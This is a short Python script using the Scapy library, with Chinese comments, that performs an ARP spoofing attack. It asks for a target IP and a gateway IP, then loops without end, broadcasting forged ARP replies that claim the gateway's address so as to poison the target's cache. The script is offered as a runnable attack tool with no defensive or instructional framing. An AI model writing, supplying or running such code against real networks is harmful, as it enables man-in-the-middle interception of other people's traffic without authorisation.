import sys
from scapy.all import ARP, Ether, sendp

# 获取目标IP和网关IP地址
target_ip = input("Please enter the destination IP address: ")
gateway_ip = input("Please enter the gateway IP address: ")

# 构造ARP请求包并发送到目标IP和网关IP
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
sendp(packet)

# 持续进行ARP欺骗攻击
while True:
    try:
        # 发送伪造的ARP响应包给目标IP和网关IP，告诉他们自己就是对方
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
        sendp(packet)
        print(f"An ARP spoofing attack has been sent to {target_ip} and {gateway_ip}")
    except KeyboardInterrupt:
        # 如果用户按下Ctrl-C，则退出程序
        print("The user interrupts the program")
        sys.exit(0)
